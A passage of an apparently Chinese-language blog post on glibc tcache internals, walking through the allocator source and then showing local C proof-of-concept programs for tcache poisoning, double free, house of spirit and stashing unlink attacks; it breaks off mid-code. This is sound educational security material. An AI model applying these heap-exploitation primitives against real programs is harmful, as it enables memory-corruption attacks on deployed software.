class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><blockquote><p>tcache_perthread_struct是用来管理tcache链表的，这个结构体位于heap段的起始位置，size大小为0x251。每一个thread都会维护一个tcache_perthread_struct结构体，一共有TCACHE_MAX_BINS个计数器TCACHE_MAX_BINS项tcache_entry。</p><ul><li>tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk</li><li>counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk</li></ul><p><img src="/2021/03/08/tcache/20210201160752119.jpg" alt="在这里插入图片描述"></p></blockquote><h2 id="2-执行流程"><a href="#2-执行流程" class="headerlink" title="2.执行流程"></a>2.执行流程</h2><ol><li>第一次malloc，会分配一块大内存存放<code>tcache_perthread_struct</code>，一般为0x251</li><li>释放chunk时，如果chunk的size小于small bin size，在<strong>进入tcache之前</strong>会先放进fastbin或者unsorted bin中</li><li>在<strong>放入tcache后</strong>：<ul><li>先放到对应的tcache中，直到tcache被填满（7个）</li><li><strong>tcache被填满后</strong>，接下来再释放chunk，就会直接放进fastbin或者unsorted bin中</li><li>tcache中的chunk<strong>不会发生合并</strong>，不取消inuse bit</li></ul></li><li>重新申请chunk，并且申请的size符合tcache的范围，则先从<strong>tcache中取chunk</strong>，直到tcache为空</li><li>tcache为空后，从bin中找</li><li>tcache为空时，如果fastbin、small bin、unsorted bin中有size符合的chunk，会先把fastbin、small bin、unsorted bin中的chunk放到tcache中，直到填满，之后再从tcache中取</li></ol><h2 id="3-源码分析"><a href="#3-源码分析" class="headerlink" title="3.源码分析"></a>3.源码分析</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">// 找到可用的 arena</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn't enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim) <span class="comment">// 初始化 tcache</span></span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里初始化了tcache</p><p>主要就是找arena和分配chunk</p></blockquote><h3 id="内存申请"><a href="#内存申请" class="headerlink" title="内存申请"></a>内存申请</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>首先是在tcache中有chunk的时候，if判断要取出的chunk的size是否满足idx的合法范围，在tcache-&gt;entries不为空时调用<code>tcache_get()</code>函数获取chunk。</p></blockquote><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class="comment">//获取指针</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);<span class="comment">//检查</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class="comment">//替换下一个指针</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); </span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>从<code>tcache-&gt;entries[tc_idx]</code>获取一个chunk指针，并且<code>tcache-&gt;counts</code>减一，没有过多的安全检查或者保护</p></blockquote><h3 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure><blockquote><p>可以看到首先判断<code>tc_idx</code>的合法性，判断<code>tcache-&gt;counts[tc_idx]</code>在7个以内时，进入<code>tcache_put()</code>函数，传递的一参为要释放的chunk指针，二参为chunk对应的size在tcache中的下标</p></blockquote><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//释放的chunk</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//判断下标是否符合</span></span><br><span class="line">  <span class="comment">//链表的替换</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  <span class="comment">//数量增加</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>tcache_put()函数执行过程中把释放的chunk插入到了tcache-&gt;entries[tc_idx]链表的头部，整个插入的过程中也没有做任何的安全检查及保护，也没有将P标志位变为0</p></blockquote><p>其实我们也发现了，重点攻击的地方应该就是<code>tcache_get</code>和<code>tcache_put</code>两个地方。</p><h1 id="0x02-PWN-tcache"><a href="#0x02-PWN-tcache" class="headerlink" title="0x02 PWN tcache"></a>0x02 PWN tcache</h1><h2 id="1-tcache-poisoning"><a href="#1-tcache-poisoning" class="headerlink" title="1.tcache poisoning"></a>1.tcache poisoning</h2><p>tcache poisoning主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址。</p><p><img src="/2021/03/08/tcache/image-20210314162103060.png" alt="image-20210314162103060"></p><p>此时如果把图中fd值改为我们想要的值，那么攻击就成功了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// disable buffering</span></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing the buffers...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p ].\n"</span>, &amp;stack_var);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2nd malloc(128): %p\n"</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We got the control\n"</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>sleep()为断点</p></blockquote><p>先看第一个断点下</p><p><img src="/2021/03/08/tcache/image-20210314165503011.png" alt="image-20210314165503011"></p><p>第二个断点</p><p><img src="/2021/03/08/tcache/image-20210314165645714.png" alt="image-20210314165645714"></p><p>很明显，当我们再次分配时，那么就会分配走我们想要的地址。</p><h2 id="2-tcache-dup"><a href="#2-tcache-dup" class="headerlink" title="2.tcache dup"></a>2.tcache dup</h2><p>上面的是针对malloc，这个针对的是free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with tcache.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating buffer.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing twice...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p ].\n"</span>, a, a);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Next allocated buffers will be same: [ %p, %p ].\n"</span>, b, c);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接看第一次断点</p><p><img src="/2021/03/08/tcache/image-20210314213639524.png" alt="image-20210314213639524"></p><p>两个是在一个位置，为什么会这样？</p><p>我们可以来看一下<code>tcache_put</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//释放的chunk</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//判断下标是否符合</span></span><br><span class="line">  <span class="comment">//链表的替换</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  <span class="comment">//数量增加</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里知识简单的链表插入，它并没有进行判断。</p><p>之后直接进行申请，我们就可以拿到同一块地址的两个指针。</p><h2 id="3-tcache-house-of-spirit"><a href="#3-tcache-house-of-spirit" class="headerlink" title="3.tcache house of spirit"></a>3.tcache house of spirit</h2><p>tcache house of spirit这种利用方式是由于tcache_put()函数检查不严格造成的，在释放的时候没有检查被释放的指针是否真的是堆块的malloc指针，<strong>如果我们构造一个size符合tcache bin size的fake_chunk</strong>，那么理论上讲其实可以将任意地址作为chunk进行释放。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This region contains one fake chunk. It's size field is placed at %p\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p\n"</span>, b);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是比较好理解的。</p><p>我们来看一下第一次断点。</p><p><img src="/2021/03/08/tcache/image-20210314215452014.png" alt="image-20210314215452014"></p><p>第一次只有<code>tcache_perthread_struct</code>和我们申请的堆块</p><p>看第二次断点</p><p><img src="/2021/03/08/tcache/image-20210314215557280.png" alt="image-20210314215557280"></p><p>bins中出现了栈上的地址，这时我们分配一下，就可以拿到栈上的指针了。</p><p><img src="/2021/03/08/tcache/image-20210314215657530.png" alt="image-20210314215657530"></p><p>栈上的指针到手。</p><h2 id="4-tcache-stashing-unlink-attack"><a href="#4-tcache-stashing-unlink-attack" class="headerlink" title="4.tcache stashing unlink attack"></a>4.tcache stashing unlink attack</h2><p>首先从名字就可以看出这种方法与unlink有关，这种攻击利用的是tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中，这种情况可以使用calloc分配同大小堆块触发，因为calloc分配堆块时不从tcache bin中选取。在获取到一个smallbin中的一个chunk后，如果tcache任由足够空闲位置，会将剩余的smallbin挂进tcache中，在这个过程中只对第一个bin进行了完整性检查，后面的堆块的检查缺失。当攻击者可以修改一个small bin的bk时，就可以实现在任意地址上写一个libc地址。构造得当的情况下也可以分配fake_chunk到任意地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack_var addr is:%p\n"</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk_lis addr is:%p\n"</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"target addr is:%p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You can see the value of fake_chunk-&gt;bk is:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Also, let's see the initial value of stack_var[4]:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we alloc 9 chunks with malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line"></span><br><span 